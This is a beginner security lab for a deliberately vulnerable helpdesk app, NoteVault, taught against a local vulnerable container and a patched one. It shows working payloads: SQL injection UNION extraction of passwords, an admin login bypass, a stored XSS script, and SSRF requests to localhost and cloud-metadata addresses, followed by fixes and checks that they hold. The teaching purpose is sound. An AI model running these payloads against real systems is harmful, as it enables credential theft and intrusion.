# Lab: The Helpdesk That Trusts Everyone (Web & API Security)

A small company runs **NoteVault**, an internal helpdesk notes portal.
Employees log in, keep private tickets, search them, comment on shared
ones, and set profile avatars by URL. It looks ordinary. It is not: four
different vulnerability classes are hiding in its dozen routes, and your
job is to find each one, prove it, and understand why the fix works.

*Time: ~60–90 min · Level: Beginner–Intermediate · Needs: Docker + a web browser + curl*

## What you'll learn

- How string-interpolated SQL becomes injection, and what a `UNION`
  extraction looks like against a real app
- The difference between authentication (who are you?) and authorization
  (may you see *this*?) — and how IDOR falls in the gap
- How stored XSS survives in a database and fires in someone else's browser
- How SSRF turns a helpful "fetch this URL" feature into the server
  attacking itself
- How to confirm every fix against a patched build, not just trust the diff

## Key ideas

- **SQL injection (SQLi)** — user input pasted into a database query changes
  the query's meaning. `' OR '1'='1` is the classic fragment.
- **IDOR / Broken Access Control** — the app checks you logged in but never
  checks the object belongs to you, so changing `2` to `3` in a URL reads
  someone else's data.
- **Stored XSS** — a script saved server-side and later rendered as HTML
  runs in every visitor's browser.
- **SSRF** — the server fetches a URL you choose, so you point it at
  internal addresses it can reach and you cannot.
- **Session** — Flask remembers you with a signed cookie. Signed with what
  is part of this lab's story (see Task 6).

## Your target

Two containers from one codebase (`app.py`, mode selected by `SECURE`):

| container | port | mode |
|---|---|---|
| `vulnerable` | **5000** | `SECURE=0` — the target. Attack this. |
| `secure` | **5001** | `SECURE=1` — the patched reference. Verify fixes here. |

Seeded data: **alice** / `alice123`, **bob** / `bob123`, **admin** /
`admin123`. Each owns private tickets. Ticket `#4` (office wifi) is shared.

## Setup

```bash
docker compose up -d --build
```

Check both are up:

```bash
curl -s http://localhost:5000/api/health
curl -s http://localhost:5001/api/health
```

```
{"secure":false,"status":"ok"}
{"secure":true,"status":"ok"}
```

Keep two terminals: port `5000` is the target from here on unless a task
says `:5001`. Log in as alice and save the session cookie — every API task
needs it:

```bash
rm -f cj.txt
curl -s -c cj.txt -d 'username=alice&password=alice123' \
  http://localhost:5000/login -o /dev/null -w '%{http_code}\n'
```

```
302
```

`302` is the login redirecting you to the dashboard — success. Open
`http://localhost:5000/dashboard` in a browser too; the UI and the API are
the same app, and some bugs are easier to see in one than the other.

## Task 1 — Map the surface

**Goal:** list what the app exposes before touching any payload.

```bash
curl -s http://localhost:5000/api/debug
```

```
{"db":"/tmp/notevault.db","routes":[...,"/api/search","/api/tickets/<int:tid>",
"/api/users/<int:uid>","/api/tickets/<int:tid>/comments","/api/avatar/fetch",
"/internal/secret",...],"secret_key_hint":"dev...","secure":false}
```

A forgotten debug route hands you the route table, the database path, and a
hint that the session secret starts with `dev`. Real apps leak like this
through `/debug`, `/actuator`, `/api-docs`, and verbose errors — always
fetch the boring endpoints first. (Check `:5001/api/debug`: `404`. Noted —
a fix you'll verify in Task 7.)

Browse as alice: dashboard, ticket `#1` (yours), profile. Notice the search
box, the comment form, and the "Avatar from URL" fetcher. Each maps to one
of your four targets:

| feature | route | suspicion |
|---|---|---|
| search | `GET /api/search?q=` | input → SQL query |
| ticket view | `GET /api/tickets/<id>` | object id in URL, no visible check |
| comments | `POST /api/tickets/<id>/comments` | user HTML stored and shown |
| avatar fetch | `POST /api/avatar/fetch` | server fetches your URL |

## Task 2 — IDOR: read tickets that aren't yours

**Goal:** prove the API authorizes login but not ownership.

You are alice. Ticket `#2` is bob's, private. Ask for it:

```bash
curl -s -b cj.txt http://localhost:5000/api/tickets/2
```

```
{"body":"Doctor note and accommodation details. Private to bob.","id":2,
"is_private":1,"owner_id":2,"title":"Medical accommodation request"}
```

`200` with full body. `is_private: 1`, `owner_id: 2` — the response itself
tells you this was supposed to be hidden. Walk the ids: `#3` is the
admin's rotation runbook. Then the user records:

```bash
curl -s -b cj.txt http://localhost:5000/api/users/2
```

```
{"email":"bob@example.com","id":2,"private_note":"Bob medical file:
accommodation request, doctor note (demo)",...}
```

Anyone authenticated reads anyone's file, including the `private_note`
field. That is the whole bug: the handler looks up the object by id and
never compares `owner_id` to the session. Authentication passed;
authorization never ran.

*Proof to keep:* both response bodies. *Secure check (later):* same two
requests against `:5001` return `{"error":"forbidden"}` / `403`.

## Task 3 — SQL injection: make the search confess

**Goal:** break out of the search query and dump the users table.

First confirm the query is injectable — a single quote should change the
response (error or anomaly), not just search for a quote:

```bash
curl -s -b cj.txt "http://localhost:5000/api/search?q='"
```

```
{"error":"near \"'\": syntax error","query":"SELECT id, title, body FROM
tickets WHERE title LIKE '%'%'"}
```

The server echoes your input inside its SQL *and* shows you the query. Two
gifts: injectability confirmed, and you now know the column count and table
shape (`id, title, body` from `tickets`). Now extract — three columns, so
`UNION SELECT` three columns from `users`:

```bash
curl -s -b cj.txt "http://localhost:5000/api/search?q='%20UNION%20SELECT%20id,username,password%20FROM%20users--%20"
```

```
[{"body":"alice123","id":1,"title":"alice"},{"body":"bob123",...},
{"body":"admin123","id":3,"title":"admin"},...]
```

Every password, through the search box. The `--` comments out the trailing
`%'`, and `users` was guessable — but you didn't have to guess: the debug
route, the error text, and `sqlite_master` are all reachable the same way
(`q='%20UNION%20SELECT%20name,sql,name%20FROM%20sqlite_master--%20` lists
every table and its schema — try it).

Bonus, same root cause in `/login`: the login form interpolates too, so

```bash
curl -s -d "username=admin'-- &password=x" http://localhost:5000/login \
  -o /dev/null -w '%{http_code} %{redirect_url}\n'
```

```
302 http://localhost:5000/dashboard
```

logs you in as admin with no password. Search was the lesson; login is the
reminder that one pattern usually infects every query the author wrote that
week.

*Proof to keep:* the UNION output. *Secure check:* on `:5001` the quote
search returns `[]` and the UNION returns `[]` — input is data, never code.

## Task 4 — Stored XSS: leave a script for the next visitor

**Goal:** store a script through the comments API and see it execute in context.

Post a benign probe to the shared ticket `#4` (shared so other users —
and you in a browser — will render it):

```bash
curl -s -b cj.txt -H 'Content-Type: application/json' \
  -d '{"body":"<script>alert(document.domain)</script>"}' \
  http://localhost:5000/api/tickets/4/comments
```

```
{"author":"alice","body":"<script>alert(document.domain)</script>","id":2}
```

Stored (note the `id`). Now open `http://localhost:5000/ticket/4` in a
browser while logged in as alice. An alert box showing `localhost` fires —
the server rendered your body with `|safe`, so the browser can't tell your
script from the app's markup. (Prefer curl? `curl -s -b cj.txt
http://localhost:5000/ticket/4 | grep '<script>alert'` shows the raw tag in
the HTML — stored unescaped.)

Think about what this means beyond the popup: the script runs as the
*viewer*. Posted on a ticket an admin reads, it runs as the admin —
stealing their session cookie, acting in their name. That is why stored XSS
outranks reflected: one post, every future reader.

*Proof to keep:* screenshot of the alert, or the `grep` output. *Secure
check:* post the same body on `:5001`, reload the page — no alert, and the
HTML shows `&lt;script&gt;`. Same bytes stored, neutralized at render.

## Task 5 — SSRF: make the server read its own secrets

**Goal:** use the avatar fetcher to reach an address only the server should see.

The profile page invites you to paste an image URL "and the server will
fetch it for you." Take it literally — ask the server to fetch *itself*:

```bash
curl -s -b cj.txt -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:5000/internal/secret"}' \
  http://localhost:5000/api/avatar/fetch
```

```
{"preview":"{\"internal_only\":true,\"note\":\"pretend this is
169.254.169.254/latest/meta-data\",\"secret\":\"flag{ssrf-reached-internal-admin}\"}",
"status":200,...}
```

`/internal/secret` stands in for what real SSRF reaches: cloud metadata
(`169.254.169.254`), admin sidecars, localhost debug ports. The fetcher
follows redirects, checks nothing, and pastes the response into your JSON.
You never touched the internal endpoint — the server did it for you, with
its network privileges.

Push it one step further: `{"url":"http://169.254.169.254/"}` errors
differently from `{"url":"http://127.0.0.1:9/"}` (DNS/connect behavior),
which is how attackers map the server's network blind. And try a
`file:///etc/passwd` URL — rejected here only because `requests` doesn't
speak `file`, a reminder that SSRF impact depends on the fetcher's
protocols, which is exactly what your fix must constrain.

*Proof to keep:* the `flag{...}` preview. *Secure check:* same request on
`:5001` → `{"error":"blocked: blocked target 127.0.0.1"}` / `400`.

## Task 6 — (Bonus) Session forgery and enumeration

**Goal:** notice the two auth weaknesses the main tasks walked past.

Recall `/api/debug`: `secret_key_hint: dev...`. The key is the Flask default
`dev-secret-change-me`, committed to the repo. Anyone who reads the source
can forge session cookies for any user with `itsdangerous` — no password
needed at all. And the login errors distinguish `Unknown user` from `Wrong
password`, letting an attacker enumerate valid usernames before guessing.
Neither is one of your four headline bugs; both are the kind of finding
that turns a good report into a thorough one. Verify: `:5001` needs
`SECRET_KEY` from the environment (refuses to start without it) and answers
every bad login with one message, `Invalid credentials`.

## Task 7 — Verify the fixes

**Goal:** confirm each vuln is dead on `:5001`, with the app still working.

Log in to the secure build and replay your four exploits:

```bash
rm -f cs.txt
curl -s -c cs.txt -d 'username=alice&password=alice123' \
  http://localhost:5001/login -o /dev/null -w '%{http_code}\n'
curl -s -b cs.txt http://localhost:5001/api/tickets/2; echo
curl -s -b cs.txt "http://localhost:5001/api/search?q=' UNION SELECT id,username,password FROM users-- "; echo
curl -s -b cs.txt -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:5000/internal/secret"}' \
  http://localhost:5001/api/avatar/fetch; echo
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5001/api/debug
```

```
302
{"error":"forbidden"}
[]
{"error":"blocked: blocked target 127.0.0.1"}
404
```

Plus the XSS render check (Task 4) and the login-bypass `401` (Task 3) on
`:5001`. Then confirm nothing legitimate broke: dashboard loads, search for
`wifi` finds ticket `#4`, commenting plain text works, avatar fetch of a
public URL still returns a preview. A fix that breaks the feature is a
regression, not a remediation — `REMEDIATION.md` details each change, and
`tests/verify.sh` automates this whole task (`bash tests/verify.sh`).

## What happened

Four bugs, one theme: **the server trusted input it should have checked.**

- Search/login built SQL by string formatting, so input became code.
- Ticket and user APIs checked login but not ownership, so ids became keys.
- Comments were stored raw and rendered `|safe`, so data became markup.
- The avatar fetcher requested whatever URL it was given, so a feature
  became a proxy into the internal network.

For real systems:

- Parameterize every query; treat any f-string/callable SQL as a finding.
- Authorize per object, per request — `owner_id == session` on reads,
  writes, and nested routes alike.
- Encode at render (and consider CSP); stored user content is never markup.
- Egress-control server-side fetches: allowlist, resolve-and-check IPs,
  no redirects, tight timeouts.

## Questions and answers

**Why did the quote test matter before the UNION?**
It separates "no results" from "broken query" — an error (or a changed
error) proves your input reached the parser. Never fire blind UNIONs
without it.

**IDOR returned 200, SQLi returned 500, SSRF returned my data — why do the
signals differ?**
Each bug lives at a different layer: access control fails open (normal
response, wrong data), SQL breaks the parser (database error), SSRF
succeeds at its job (fetched content). Learn each layer's tell.

**Why is stored XSS worse than the alert box suggests?**
The box is a probe. The payload that matters steals the *viewer's* session
— post where an admin looks and you inherit the admin.

**Why couldn't `file:///etc/passwd` work here?**
The fetcher library only speaks HTTP(S). SSRF severity follows the
fetcher's protocol support — which is why allowlisting scheme + host +
resolved IP all matter, not just one.

**What is the fix in one sentence per bug?**
Bind parameters; check ownership; escape on render (+CSP); validate and
constrain outbound requests. See `REMEDIATION.md` for the exact diffs.

## Cleanup

```bash
docker compose down
```
